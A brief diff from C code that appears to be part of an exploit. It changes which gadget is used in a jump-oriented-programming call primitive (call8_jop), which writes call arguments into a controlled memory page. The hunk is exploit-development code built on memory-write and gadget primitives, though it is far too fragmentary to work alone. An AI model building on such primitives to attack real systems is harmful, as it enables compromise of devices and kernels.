@@ -216,7 +216,7 @@ uint64_t call8_jop(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_
     write64(my_page + 0x878, x4);
     
     uint64_t STORED_RET = my_page + 0x100;
-    uint64_t ret2 = my_call6(gadget_populate, my_page, STORED_RET, 0, 0, 0, 0, 0);
+    uint64_t ret2 = my_call6(gadget_prologue, my_page, STORED_RET, 0, 0, 0, 0, 0);
 
     // hexdump(my_page, 0x1000);
 
